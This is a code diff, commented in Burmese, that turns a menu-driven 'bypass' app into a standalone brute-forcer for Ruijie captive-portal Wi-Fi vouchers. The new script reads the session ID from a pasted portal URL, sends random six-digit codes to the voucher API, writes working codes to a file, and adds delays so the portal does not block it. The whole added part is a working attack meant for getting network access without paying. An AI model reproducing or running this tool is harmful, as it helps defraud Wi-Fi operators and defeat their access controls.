@@ -1,54 +1,54 @@
-import main  # main.so ကို import လုပ်ခြင်း
-import os
-import sys
+import requests
+import random
+import time
+import re
+from urllib.parse import urlparse
 
-# UI အတွက် အရောင်များ
+# UI Colors
 G = '\033[92m'
 R = '\033[91m'
 C = '\033[96m'
 Y = '\033[93m'
 W = '\033[0m'
 
-def execute_app():
-    # Device ID စစ်ဆေးခြင်း
-    did = main.get_device_id()
+def start_manual_brute():
+    print(f"{C}[*] Ruijie Brute Force Engine (Manual Mode){W}")
+    # Browser ထဲက Portal URL တစ်ခုလုံးကို ဒီမှာ Paste လုပ်ခိုင်းပါမယ်
+    url = input(f"{Y}Paste Portal URL: {W}").strip()
     
-    # Time Manipulation စစ်ဆေးခြင်း
-    if not main.check_time_manipulation():
-        print(f"{R}[!] Time Error!{W}")
-        return
-
-    # ပထမဆုံး License စစ်ဆေးခြင်း
-    # (မှတ်ချက် - validate_key logic ကို .so ထဲမှာ ထည့်ထားရပါမယ်)
-    
-    print(f"{C}[+] Device ID: {did}{W}")
-    
-    while True:
-        print(f"\n{Y}╔════════════════════════════════════════╗")
-        print(f"║ {W}[1] START INSTANT BYPASS (PING)      {Y}║")
-        print(f"║ {W}[2] BRUTEFORCE 6-DIGIT VOUCHERS      {Y}║")
-        print(f"║ {W}[3] EXIT                             {Y}║")
-        print(f"╚════════════════════════════════════════╝{W}")
+    try:
+        # URL ထဲက sessionId နဲ့ API endpoint ကို ထုတ်ယူခြင်း
+        sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', url).group(1)
+        parsed = urlparse(url)
+        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
         
-        opt = input(f"{C}Select Option: {W}").strip()
+        print(f"{G}[+] Session ID Detected: {sid[:10]}...{W}")
+        print(f"{G}[+] API Ready: {api_url}{W}")
         
-        if opt == '1':
-            main.start_bypass()
-        elif opt == '2':
-            # Session ID ကို အရင်ရှာပြီးမှ Bruteforce ခေါ်ခြင်း
-            sid = main.get_session_info()
-            if sid:
-                main.voucher_bruteforce_engine(sid)
-            else:
-                print(f"{R}[!] No Session Found. Connect to Wifi!{W}")
-        elif opt == '3':
-            print(f"{Y}[*] Goodbye!{W}")
-            sys.exit()
-        else:
-            print(f"{R}[!] Invalid Option!{W}")
+        while True:
+            # 6-Digit Brute Force
+            code = "".join([str(random.randint(0, 9)) for _ in range(6)])
+            
+            payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
+            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
+            
+            try:
+                res = requests.post(api_url, json=payload, headers=headers, timeout=5)
+                if res.status_code == 200:
+                    print(f"\n{G}[✅] WORKING CODE FOUND: {code}{W}")
+                    with open("found.txt", "a") as f: f.write(code + "\n")
+                    # အင်တာနက် ပွင့်မပွင့် Browser မှာ ချက်ချင်းစမ်းပါ
+                else:
+                    print(f"{W}[*] Testing: {code} {R}[Invalid]{W}", end="\r")
+                
+                # Block မခံရအောင် Delay ထည့်ပါ (အရေးကြီးသည်)
+                time.sleep(1.5)
+            except:
+                print(f"\n{R}[!] Request Error. Waiting...{W}")
+                time.sleep(5)
+                
+    except Exception as e:
+        print(f"{R}[!] Error parsing URL: {e}{W}")
 
 if __name__ == "__main__":
-    try:
-        execute_app()
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Stopped by user.{W}")
+    start_manual_brute()
